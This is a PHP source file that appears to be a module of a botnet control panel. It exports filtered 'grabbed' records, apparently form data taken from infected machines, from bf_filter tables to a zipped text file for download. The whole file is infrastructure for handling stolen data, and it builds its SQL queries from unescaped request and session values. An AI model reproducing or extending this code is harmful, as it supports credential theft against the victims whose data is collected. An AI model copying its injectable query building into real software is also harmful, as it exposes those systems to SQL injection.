<?php

$dir = str_replace('\\', '/', pathinfo(__FILE__, PATHINFO_DIRNAME));
$dir = str_replace('/modules/filters', '/', $dir);
//$dir = $dir . 'cache/';
$dir = '/tmp/';

if(!empty($Cur['id'])){	if(file_exists($dir . $Cur['id'])) exit('LOADING FROM THIS FILTER IT IS NOT POSSIBLE, PROCESS BUSY!');
	file_put_contents($dir . $Cur['id'], true);
	$filter = $mysqli->query('SELECT * FROM bf_filters WHERE (id = \''. $Cur['id'].'\')');

	if($filter->id != $Cur['id']){
		@unlink($dir . $Cur['id']);
		exit('ERROR FILTER!');
	}
}elseif(!empty($Cur['str'])){	if(file_exists($dir . $Cur['str'])) exit('LOADING FROM THIS FILTER IT IS NOT POSSIBLE, PROCESS BUSY!');
	file_put_contents($dir . $Cur['str'], true);

	switch($Cur['str']){
		case 'me':
	       	$filter->id = 'me';
	       	$filter->name = 'me';
		break;

		case 'ft':
	       	$filter->id = 'ft';
	       	$filter->name = 'ft';
		break;

		case 'ep':
	      	$filter->id = 'ep';
	       	$filter->name = 'ep';
		break;

		case 'rd':
	       	$filter->id = 'rd';
	       	$filter->name = 'rd';
		break;

		default:
        	@unlink($dir . $Cur['str']);
        	exit('ERROR FILTER!');
		break;
	}
}

get_function('encapsules');

if(count($_POST) > 0){
	if($_POST['prefix'] != $_SESSION['search']['prefix_' . $filter->id]){
		$_SESSION['search']['prefix_' . $filter->id] = $_POST['prefix'];
	}

	if($_POST['mask_uid'] != $_SESSION['search']['mask_uid_' . $filter->id]){
		$_SESSION['search']['mask_uid_' . $filter->id] = $_POST['mask_uid'];
	}

	if($_POST['program'] != $_SESSION['search']['program_' . $filter->id]){
		$_SESSION['search']['program_' . $filter->id] = $_POST['program'];
	}

	if($_POST['status'] != $_SESSION['search']['status_' . $filter->id]){
		$_SESSION['search']['status_' . $filter->id] = $_POST['status'];
	}

	if($_POST['type'] != $_SESSION['search']['type_' . $filter->id]){
		$_SESSION['search']['type_' . $filter->id] = $_POST['type'];
	}

	if($_POST['gra_fields'] != $_SESSION['search']['gra_fields_' . $filter->id]){
		$_SESSION['search']['gra_fields_' . $filter->id] = $_POST['gra_fields'];
	}

	if($_POST['fgr_fields'] != $_SESSION['search']['fgr_fields_' . $filter->id]){
		$_SESSION['search']['fgr_fields_' . $filter->id] = $_POST['fgr_fields'];
	}

	if($_POST['url'] != $_SESSION['search']['url_' . $filter->id]){
		$_SESSION['search']['url_' . $filter->id] = $_POST['url'];
	}

	if($_POST['data1'] != $_SESSION['search']['data1_' . $filter->id]){
		$_SESSION['search']['data1_' . $filter->id] = $_POST['data1'];
	}

	if($_POST['data2'] != $_SESSION['search']['data2_' . $filter->id]){
		$_SESSION['search']['data2_' . $filter->id] = $_POST['data2'];
	}

	if($_POST['country'] != $_SESSION['search']['country_' . $filter->id]){
		$_SESSION['search']['country_' . $filter->id] = $_POST['country'];
	}

	if($_POST['addstr'] != $_SESSION['search']['addstr_' . $filter->id]){
		$_SESSION['search']['addstr_' . $filter->id] = $_POST['addstr'];
	}

	if($_POST['sized'][0] != $_SESSION['search']['sized' . $filter->id][0] || $_POST['sized'][1] != $_SESSION['search']['sized' . $filter->id][1]){
		$_SESSION['search']['sized_' . $filter->id] = $_POST['sized'];
	}

	if($_POST['sized'][2] != $_SESSION['search']['sized' . $filter->id][2] || $_POST['sized'][1] != $_SESSION['search']['sized' . $filter->id][3]){
		$_SESSION['search']['sized_' . $filter->id] = $_POST['sized'];
	}
}

$sql = '';

if(!empty($_SESSION['search']['prefix_' . $filter->id])){	$_POST['prefix'] = $_SESSION['search']['prefix_' . $filter->id];
	$sql .= '(prefix=\''.$_SESSION['search']['prefix_' . $filter->id].'\')';
}

if(!empty($_SESSION['search']['sized_' . $filter->id][1])){
	$_POST['sized'][0] = $_SESSION['search']['sized_' . $filter->id][0];
	$_POST['sized'][1] = $_SESSION['search']['sized_' . $filter->id][1];
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(size '.$_SESSION['search']['sized_' . $filter->id][0].' \''.$_SESSION['search']['sized_' . $filter->id][1].'\')';
}

if(!empty($_SESSION['search']['sized_' . $filter->id][3])){
	$_POST['sized'][2] = $_SESSION['search']['sized_' . $filter->id][2];
	$_POST['sized'][3] = $_SESSION['search']['sized_' . $filter->id][3];
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(size '.$_SESSION['search']['sized_' . $filter->id][2].' \''.$_SESSION['search']['sized_' . $filter->id][3].'\')';
}

if(!empty($_SESSION['search']['mask_uid_' . $filter->id])){
	if(!empty($sql)) $sql .= ' AND ';
	$_POST['mask_uid'] = $_SESSION['search']['mask_uid_' . $filter->id];
	$sql .= '(uid LIKE \''.$_SESSION['search']['mask_uid_' . $filter->id].'%\')';
}

if(!empty($_SESSION['search']['country_' . $filter->id])){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(country=\''.$_SESSION['search']['country_' . $filter->id].'\')';
	$_POST['country'] = $_SESSION['search']['country_' . $filter->id];
}

if(!empty($_SESSION['search']['addstr_' . $filter->id])){
	$_POST['addstr'] = $_SESSION['search']['addstr_' . $filter->id];
}

if(!empty($_SESSION['search']['program_' . $filter->id])){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(program=\''.$_SESSION['search']['program_' . $filter->id].'\')';
	$_POST['program'] = $_SESSION['search']['program_' . $filter->id];
}

if(!empty($_SESSION['search']['type_' . $filter->id])){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(type=\''.$_SESSION['search']['type_' . $filter->id].'\')';
	$_POST['type'] = $_SESSION['search']['type_' . $filter->id];
	$_POST['gra_fields'] = $_SESSION['search']['gra_fields_' . $filter->id];
	$_POST['fgr_fields'] = $_SESSION['search']['fgr_fields_' . $filter->id];

	if($_POST['type'] == '5' && !empty($_POST['fgr_fields'])){
		$fgr_fields = explode(',', $_SESSION['search']['fgr_fields_' . $filter->id]);
		if(count($fgr_fields) > 0){
			foreach($fgr_fields as $it){
				if(!empty($it)) $sql .= ' AND (fields LIKE \'%'.$it.',%\')';
			}
		}
	}elseif($_POST['type'] == '6' && !empty($_POST['gra_fields'])){
		$sql .= ' AND (fields=\''.$_SESSION['search']['gra_fields_' . $filter->id].'\')';
	}
}

if(!empty($_SESSION['search']['url_' . $filter->id])){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(url LIKE \'%'.$_SESSION['search']['url_' . $filter->id].'%\')';
	$_POST['url'] = $_SESSION['search']['url_' . $filter->id];
}

if($_SESSION['search']['status_' . $filter->id] == 'nuls'){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(save=\'0\')';
	$_POST['status'] = $_SESSION['search']['status_' . $filter->id];
}elseif($_SESSION['search']['status_' . $filter->id] == '1'){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(save!=\'0\')';
	$_POST['status'] = $_SESSION['search']['status_' . $filter->id];
}

if(!empty($_SESSION['search']['data1_' . $filter->id]) && !empty($_SESSION['search']['data2_' . $filter->id])){
	if($_SESSION['search']['data1_' . $filter->id] != 'ALL' && $_SESSION['search']['data2_' . $filter->id] != 'ALL'){
		if(!empty($sql)) $sql .= ' AND ';
		if($_SESSION['search']['data1_' . $filter->id] == $_SESSION['search']['data2_' . $filter->id]){
			$sql .= '(post_date > \''.$_SESSION['search']['data1_' . $filter->id].' 00:00:00\')';
		}else{
			if($_SESSION['search']['data1_' . $filter->id] == 'ALL'){
				$sql .= '(post_date < \''.$_SESSION['search']['data2_' . $filter->id].' 23:59:59\')';
			}elseif($_SESSION['search']['data2_' . $filter->id] == 'ALL'){
				$sql .= '(post_date > \''.$_SESSION['search']['data1_' . $filter->id].' 00:00:00\')';
			}else{
				$sql .= '(post_date > \''.$_SESSION['search']['data1_' . $filter->id].' 00:00:00\') AND (post_date < \''.$_SESSION['search']['data2_' . $filter->id].' 23:59:59\')';
			}
		}
	}
	$_POST['data1'] = $_SESSION['search']['data1_' . $filter->id];
	$_POST['data2'] = $_SESSION['search']['data2_' . $filter->id];
}

do{
	$rand = mt_rand('1', '9999999');
    $count = $mysqli->query_name('SELECT COUNT(*) count FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');
 }while($count != 0);

if(!empty($sql)) $sql = ' WHERE ' . $sql;

if(empty($_POST['limit'])){	$mysqli->query('UPDATE bf_filter_' . $filter->id . ' SET save = \''.$rand.'\' ' . $sql);
}else{	$mysqli->query('UPDATE bf_filter_' . $filter->id . ' SET save = \''.$rand.'\' ' . $sql . ' LIMIT ' . $_POST['limit']);
}

if(empty($_POST['limit'])){
	$file_name = $dir . 'filter_' . encapsules($filter->name) . '_all_' . $rand . '.txt';
}else{
	$file_name = $dir . 'filter_' . encapsules($filter->name) . '_limit-'.$_POST['limit'].'_' . $rand . '.txt';
}

//get_function('mysql_urldecode');
//$mysqli->db[0]->query(mysql_urldecode());

if(empty($_SESSION['search']['addstr_' . $filter->id])){
	$mysqli->db[0]->query('SELECT urldecode(data) INTO OUTFILE \''.$file_name.'\' FIELDS TERMINATED BY \';\' LINES TERMINATED BY \'\r\n\' FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');
}else{	$mysqli->db[0]->query('SELECT concat(urldecode(data), \''.$_SESSION['search']['addstr_' . $filter->id].'\') INTO OUTFILE \''.$file_name.'\' FIELDS TERMINATED BY \';\' LINES TERMINATED BY \'\r\n\' FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');
}

if($_POST['delete'] == 'on') $mysqli->db[0]->real_query('DELETE FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');

@unlink($dir . $filter->id);

if(file_exists($file_name)){
	if(extension_loaded ('zip')){		$zip_name = str_replace('.txt', '.zip', $file_name);
		$zip = new ZipArchive;
		$res = $zip->open($zip_name, ZIPARCHIVE::OVERWRITE);
		if($res === TRUE){			$zip->addFile($file_name, basename($file_name));
			$zip->close();
			unlink($file_name);
			$file_name = $zip_name;
		}
	}

	header( "Content-Disposition: attachment; filename=\"" . basename($file_name) . '"' );
	if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
		header( 'X-LIGHTTPD-send-file: ' . $file_name);
	}elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
		header('X-Sendfile: ' . $file_name);
	}
}else{
	exit('NOT FILE!');
}

@unlink($dir . $filter->id);

exit;

?>